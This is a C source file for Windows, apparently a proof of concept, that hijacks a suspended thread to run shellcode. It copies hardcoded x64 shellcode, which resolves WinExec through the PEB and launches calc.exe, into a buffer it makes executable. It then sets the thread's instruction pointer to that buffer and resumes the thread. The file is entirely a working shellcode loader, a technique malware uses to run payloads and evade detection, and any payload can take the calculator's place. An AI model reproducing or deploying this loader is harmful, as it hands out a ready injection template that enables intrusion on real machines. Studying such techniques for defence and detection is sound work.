#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

void DummyFunction(void)
{
    printf("LITERALLY THIRD WHEELING\n");
    return;
}

int main(void)
{
    DWORD OldProtection = 0;
    CONTEXT CTX = {.ContextFlags = CONTEXT_ALL};

    // Your raw shellcode from the ASM compilation
    // 
    unsigned char shellcode[] = {
        0x48, 0x83, 0xec, 0x28, 0x48, 0x31, 0xf6, 0x65, 0x48, 0x8b, 0x76, 0x60,
        0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x30, 0x48, 0x8b, 0x36, 0x48,
        0x8b, 0x36, 0x48, 0x8b, 0x6e, 0x10, 0x8b, 0x45, 0x3c, 0x48, 0x01, 0xe8,
        0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xe8, 0x44, 0x8b, 0x60,
        0x18, 0x44, 0x8b, 0x68, 0x20, 0x49, 0x01, 0xed, 0x44, 0x8b, 0x70, 0x24,
        0x49, 0x01, 0xee, 0x44, 0x8b, 0x78, 0x1c, 0x49, 0x01, 0xef, 0x49, 0xff,
        0xcc, 0x43, 0x8b, 0x7c, 0xa5, 0x00, 0x48, 0x01, 0xef, 0x48, 0xb8, 0x57,
        0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x39, 0x07, 0x75, 0xe6,
        0x43, 0x0f, 0xb7, 0x04, 0x66, 0x41, 0x8b, 0x04, 0x87, 0x48, 0x01, 0xe8,
        0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
        0x78, 0x65, 0x52, 0x48, 0x89, 0xe1, 0xba, 0x01, 0x00, 0x00, 0x00, 0xff,
        0xd0, 0x48, 0x83, 0xc4, 0x38, 0xc3};

    DWORD shellcode_size = sizeof(shellcode);
    HANDLE hThread = NULL;
    PVOID Buffer = NULL;

    printf("[+] Creating a suspended thread...\n");
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);

    if (hThread == NULL)
    {
        printf("[CreateThread] FAILED, error %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[0x%p] Created thread (%ld). Beginning hijack...\n", hThread, GetThreadId(hThread));

    // Allocate memory for the shellcode
    Buffer = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Buffer == NULL)
    {
        printf("[VirtualAlloc] FAILED, error %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    // Copy shellcode to allocated buffer
    RtlCopyMemory(Buffer, shellcode, shellcode_size);
    printf("[0x%p] Copied %lu bytes to buffer.\n", Buffer, shellcode_size);

    // Make the buffer executable
    if (!VirtualProtect(Buffer, shellcode_size, PAGE_EXECUTE_READ, &OldProtection))
    {
        printf("[VirtualProtect] FAILED, error %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    // Get current thread context
    if (!GetThreadContext(hThread, &CTX))
    {
        printf("[GetThreadContext] FAILED, error %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    // Redirect RIP to our shellcode buffer
    printf("[*] Redirecting RIP from 0x%p to 0x%p\n", (PVOID)CTX.Rip, Buffer);
    CTX.Rip = (DWORD64)Buffer;

    if (!SetThreadContext(hThread, &CTX))
    {
        printf("[SetThreadContext] FAILED, error %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    // Resume execution
    printf("[+] Hijack successful! Resuming thread...\n");
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread finished execution. Cleaning up...\n");

    VirtualFree(Buffer, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return EXIT_SUCCESS;
}